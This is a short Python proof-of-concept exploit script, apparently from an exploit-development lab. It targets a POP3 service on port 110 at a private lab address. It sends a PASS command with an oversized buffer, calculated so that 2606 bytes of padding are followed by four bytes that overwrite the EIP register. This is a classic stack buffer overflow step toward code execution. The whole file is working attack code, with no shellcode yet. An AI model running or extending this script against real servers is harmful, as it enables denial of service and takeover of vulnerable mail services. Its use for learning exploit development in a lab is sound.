#!/usr/bin/python3

import socket
from time import sleep

# consts
IP = '192.168.56.102'
PORT = 110
MAX_BUFFER_SIZE = 2750
EIP_OFFSET = 2606

# POC - send 4 bytes to the EIP
buffer = EIP_OFFSET * 'A' + 4 * 'B' + (MAX_BUFFER_SIZE - EIP_OFFSET - 4) * 'C'

try:
    # Connect
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))

    # Send Username
    welcome = s.recv(1024)
    username = ('USER Aviv' + '\r\n').encode()
    s.send(username)

    # Send Password
    greet_user = s.recv(1024)
    password = ('PASS ' + buffer +  '\r\n').encode()

    print(f'Attempting to send {len(buffer)} bytes.')
    s.send(password)

    print('\n- Buffer Sent')

except Exception as e:
    print(e)
    exit()